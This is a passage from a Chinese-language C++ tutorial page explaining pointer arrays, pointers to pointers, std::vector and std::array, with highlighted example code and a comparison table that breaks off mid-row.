指针的数组</span></span><br><span class="line"></span><br><span class="line">    ptr_array[<span class="number">0</span>] = &amp;a; <span class="comment">// 第一个元素指向 a</span></span><br><span class="line">    ptr_array[<span class="number">1</span>] = &amp;b; <span class="comment">// 第二个元素指向 b</span></span><br><span class="line">    ptr_array[<span class="number">2</span>] = &amp;c; <span class="comment">// 第三个元素指向 c</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Values via pointer array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Value at *ptr_array[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; *ptr_array[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以指向动态分配的内存</span></span><br><span class="line">    <span class="keyword">int</span>* dyn_ptr_array[<span class="number">2</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">100</span>);</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDynamic values:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放动态内存</span></span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">1</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针数组常用于存储 C 风格字符串数组（<code>const char*[]</code>）或管理一组动态分配的对象。</p><p><strong>4. 指向指针的指针 (Pointer to Pointer):</strong></p><p>指针本身也是变量，它也有自己的内存地址。因此，可以声明一个指向指针的指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">int</span> *ptr = &amp;value;      <span class="comment">// ptr 指向 value (int*)</span></span><br><span class="line">    <span class="keyword">int</span> **pptr = &amp;ptr;      <span class="comment">// pptr 指向 ptr (int**)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of value (&amp;value): &quot;</span> &lt;&lt; &amp;value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of ptr (address of value): &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via ptr (*ptr): &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;           <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of ptr (&amp;ptr): &quot;</span> &lt;&lt; &amp;ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pptr (address of ptr): &quot;</span> &lt;&lt; pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ptr 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (*pptr): &quot;</span> &lt;&lt; *pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// ptr 的值 (即 value 的地址)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (**pptr): &quot;</span> &lt;&lt; **pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// value 的值 (42)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改值</span></span><br><span class="line">    **pptr = <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 50</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指向指针的指针常用于：</p><ul><li>  在函数中修改调用者传入的指针本身（使其指向不同的地址）。</li><li>  处理动态分配的指针数组（例如 <code>char** argv</code> in <code>main</code>）。</li></ul><p><strong>总结:</strong></p><p>通过组合基本类型、数组、结构、指针等，可以构建出非常灵活和强大的数据结构。理解每种组合方式的内存布局、访问方式以及（特别是涉及指针和动态内存时）生命周期管理规则是编写复杂 C++程序的关键。随着学习的深入，我们将看到更多高级的组合和抽象方式，例如使用类和标准库容器。</p><h2 id="4-10-数组的替代品"><a href="#4-10-数组的替代品" class="headerlink" title="4.10 数组的替代品"></a>4.10 数组的替代品</h2><p>虽然 C++ 内置的数组（包括动态分配的数组）功能强大，但它们存在一些固有的缺点：数组大小通常需要在编译时确定（对于栈上的数组），或者需要手动进行动态内存管理（对于堆上的数组），并且不提供边界检查等安全特性。</p><p>C++ 标准模板库 (STL) 提供了更安全、更灵活的数组替代品：<code>vector</code> 和 <code>array</code>。</p><h3 id="4-10-1-模板类vector"><a href="#4-10-1-模板类vector" class="headerlink" title="4.10.1 模板类vector"></a>4.10.1 模板类vector</h3><p><code>std::vector</code> 是 STL 提供的一个<strong>动态数组</strong>模板类。它封装了动态大小的数组，可以根据需要自动增长或缩小，并负责管理其元素的内存。</p><p><strong>特点:</strong></p><ul><li>  <strong>动态大小:</strong> 可以在运行时添加或删除元素，<code>vector</code> 会自动处理内存的重新分配。</li><li>  <strong>内存管理:</strong> 自动管理元素存储的内存（通常在自由存储区/堆上分配）。</li><li>  <strong>随机访问:</strong> 像普通数组一样，可以通过索引 <code>[]</code> 快速访问任何元素。</li><li>  <strong>边界检查 (可选):</strong> 提供 <code>at()</code> 成员函数进行带边界检查的元素访问。</li><li>  <strong>丰富的成员函数:</strong> 提供 <code>push_back()</code>, <code>pop_back()</code>, <code>size()</code>, <code>empty()</code>, <code>clear()</code>, <code>insert()</code>, <code>erase()</code> 等多种方便的操作。</li><li>  <strong>模板类:</strong> <code>vector</code> 是一个模板，需要指定存储的元素类型，例如 <code>std::vector&lt;int&gt;</code>, <code>std::vector&lt;double&gt;</code>, <code>std::vector&lt;std::string&gt;</code>。</li></ul><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;vector&gt;</code></li><li><strong>声明和初始化:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores; <span class="comment">// 创建一个空的 int vector</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">lengths</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 创建包含 10 个 double 元素的 vector (默认初始化为 0.0)</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">names</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;Unknown&quot;</span>)</span></span>; <span class="comment">// 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 列表初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; primes &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>&#125;; <span class="comment">// 创建并初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>访问元素:</strong><ul><li>  <code>[]</code> 运算符: <code>scores[0]</code>, <code>names[i]</code> (不进行边界检查)。</li><li>  <code>at()</code> 函数: <code>scores.at(0)</code>, <code>names.at(i)</code> (进行边界检查，越界抛出 <code>std::out_of_range</code> 异常)。</li></ul></li><li><strong>常用操作:</strong><ul><li>  <code>push_back(value)</code>: 在 <code>vector</code> 末尾添加一个元素。</li><li>  <code>size()</code>: 返回 <code>vector</code> 中元素的数量。</li><li>  <code>empty()</code>: 检查 <code>vector</code> 是否为空。</li><li>  <code>clear()</code>: 移除所有元素。</li><li>  <code>pop_back()</code>: 移除末尾的元素。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建和初始化</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers; <span class="comment">// 空 vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; tasks &#123;<span class="string">&quot;Read&quot;</span>, <span class="string">&quot;Write&quot;</span>, <span class="string">&quot;Code&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加元素</span></span><br><span class="line">    numbers.push_back(<span class="number">10</span>); <span class="comment">// numbers: &#123;10&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">20</span>); <span class="comment">// numbers: &#123;10, 20&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">30</span>); <span class="comment">// numbers: &#123;10, 20, 30&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First number: &quot;</span> &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second task: &quot;</span> &lt;&lt; tasks.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Write</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; tasks.at(3); // 会抛出异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改元素</span></span><br><span class="line">    numbers[<span class="number">0</span>] = <span class="number">15</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大小</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of tasks: &quot;</span> &lt;&lt; tasks.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 vector (C++11 基于范围的 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Numbers: 15 20 30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 vector (传统 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tasks:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tasks.size(); ++i) &#123; <span class="comment">// 使用 size_t 作为索引类型</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; tasks[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Tasks: Read Write Code</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除末尾元素</span></span><br><span class="line">    numbers.pop_back(); <span class="comment">// numbers: &#123;15, 20&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last number after pop: &quot;</span> &lt;&lt; numbers.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// back() 访问最后一个元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::vector</code> 是 C++ 中替代动态数组的首选方案，因为它更安全、更易于管理。</p><h3 id="4-10-2-模板类array（C-11）"><a href="#4-10-2-模板类array（C-11）" class="headerlink" title="4.10.2 模板类array（C++11）"></a>4.10.2 模板类array（C++11）</h3><p>C++11 引入了 <code>std::array</code> 模板类，它封装了<strong>固定大小</strong>的数组。与 C 风格数组类似，其大小在编译时确定，但它提供了更现代的接口和一些 <code>vector</code> 具有的便利性（如 <code>size()</code>, <code>at()</code>）。</p><p><strong>特点:</strong></p><ul><li>  <strong>固定大小:</strong> 数组大小必须在编译时指定为模板参数，之后不能改变。</li><li>  <strong>内存位置:</strong> 通常在栈上分配内存（如果作为局部变量声明），与 C 风格数组类似，除非显式使用 <code>new</code> 创建。</li><li>  <strong>类型安全:</strong> 大小是类型的一部分 (<code>std::array&lt;int, 5&gt;</code> 和 <code>std::array&lt;int, 10&gt;</code> 是不同的类型)。</li><li>  <strong>STL 接口:</strong> 提供与 <code>vector</code> 类似的接口，如 <code>size()</code>, <code>empty()</code>, <code>at()</code>, <code>[]</code>, <code>front()</code>, <code>back()</code>，以及迭代器支持，可以方便地与 STL 算法一起使用。</li><li>  <strong>无开销抽象:</strong> 通常不会比 C 风格数组带来额外的运行时性能开销。</li><li>  <strong>模板类:</strong> 需要指定元素类型和大小，例如 <code>std::array&lt;int, 10&gt;</code>, <code>std::array&lt;double, 3&gt;</code>。</li></ul><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;array&gt;</code></li><li><strong>声明和初始化:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; scores; <span class="comment">// 创建包含 5 个 int 的 array (元素值未定义，除非是静态存储)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 3&gt; coords &#123;&#125;; <span class="comment">// 创建包含 3 个 double 的 array, 零初始化 &#123;0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 列表初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 4&gt; values &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;; <span class="comment">// 创建并初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 2&gt; names &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 初始化列表的元素数量不能超过 array 的大小</span></span><br><span class="line"><span class="comment">// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // 错误!</span></span><br><span class="line"><span class="comment">// 如果元素数量少于 array 大小，剩余元素会被值初始化 (通常为 0)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; partial &#123;<span class="number">10</span>, <span class="number">20</span>&#125;; <span class="comment">// &#123;10, 20, 0, 0, 0&#125;</span></span><br></pre></td></tr></table></figure></li><li><strong>访问元素:</strong><ul><li>  <code>[]</code> 运算符: <code>scores[0]</code>, <code>names[i]</code> (不进行边界检查)。</li><li>  <code>at()</code> 函数: <code>scores.at(0)</code>, <code>names.at(i)</code> (进行边界检查，越界抛出 <code>std::out_of_range</code> 异常)。</li></ul></li><li><strong>常用操作:</strong><ul><li>  <code>size()</code>: 返回数组的大小（编译时常量）。</li><li>  <code>empty()</code>: 检查数组是否为空（对于大小 &gt; 0 的 <code>std::array</code> 总是返回 <code>false</code>）。</li><li>  <code>fill(value)</code>: 将所有元素设置为指定值。</li><li>  <code>front()</code>: 访问第一个元素。</li><li>  <code>back()</code>: 访问最后一个元素。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // 为了 std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建和初始化</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; data &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; colors &#123;<span class="string">&quot;Red&quot;</span>, <span class="string">&quot;Green&quot;</span>, <span class="string">&quot;Blue&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 4&gt; temps &#123;&#125;; <span class="comment">// &#123;0.0, 0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First data element: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second color: &quot;</span> &lt;&lt; colors.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Green</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A temperature: &quot;</span> &lt;&lt; temps[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大小</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of data array: &quot;</span> &lt;&lt; data.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填充</span></span><br><span class="line">    temps.fill(<span class="number">25.5</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Filled temperature: &quot;</span> &lt;&lt; temps[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 25.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 (C++11 基于范围的 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Colors:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; color : colors) &#123; <span class="comment">// 使用 const 引用避免复制</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Colors: Red Green Blue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 与 STL 算法一起使用</span></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="built_in">std</span>::accumulate(temps.begin(), temps.end(), <span class="number">0.0</span>); <span class="comment">// 计算总和</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of temperatures: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::array</code> 是替代需要固定大小数组的 C 风格数组的现代 C++ 方案。</p><h3 id="4-10-3-比较数组、vector对象和array对象"><a href="#4-10-3-比较数组、vector对象和array对象" class="headerlink" title="4.10.3 比较数组、vector对象和array对象"></a>4.10.3 比较数组、vector对象和array对象</h3><table><thead><tr><th align="left">特性</th><th align="left">C 风格数组 (<code>T[]</code>)</th><th align="left"><code>std::vector&lt;T&gt;</code></th><th align="left"><code>std::array&lt;T, N&gt;</code> (C++11)</th></tr></thead><tbody><tr><td align="left"><strong>大小</strong></td><td align="left">固定 (编译时确定栈数组，运行时确定堆数组)</td><td align="left">动态 (可运行时改变)</td><td align="left">固定 (编译时确定)</td></tr><tr><td align="left"><strong>内存分配</strong></td><td align="left">栈 (局部) 或 静态区 或 堆 (<code>new[]</code>)</td><td align="left">通常在堆上 (自由存储区)</td><td align="left">通常在栈上 (除非用 <code>new</code> 创建)</td></tr><tr><td align="left"><strong>大小信息</strong></td><td align="left">无内置方法获取大小 (需单独传递)</td><td align="left"><code>size()</code> 成员函数</td><td align="left"><code>size()</code> 成员函数 (编译时常量)</td></tr><tr><td align="left"><strong>边界检查</strong></td><td align="left">无 (不安全)</td><td align="left"><code>at()</code> 提供检查, <code>[]</code> 不提供</td><td align="left"><code>at()</code> 提供检查, <code>[]</code> 不提供</td></tr><tr><td align="left"><strong>赋值/复制</strong></td><td align="left">不能直接赋值/复制整个数组</td><td align="left">可以直接赋值/复制 (深拷贝)</td><td align="left">可以直接赋值/复制 (成员逐一复制)</td></tr><tr><td align="left"><strong>作为函数参数</strong></td><td align="left">通常退化为指针 (丢失大小信息)</td><td align="left">可以按值、引用或指针传递</td><td align="left">可以按值、引用或指针传递</td></tr><tr><td align="left"><strong>STL 兼容性</strong></td><td align="left">有限 (需要指针和大小)</td><td align="left">完全兼容 (提供迭代器等)</td><td align="left">完全兼容 (提供迭代器等)</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">通常最快 (直接内存访问)</td><td align="left">访问速度快，添加/删除可能涉及内存重分配</td><td align="left">通常与 C 风格数组性能相同</td></tr><tr><td align="left"><strong>头文件</strong></td><td align="left">无需</td><td 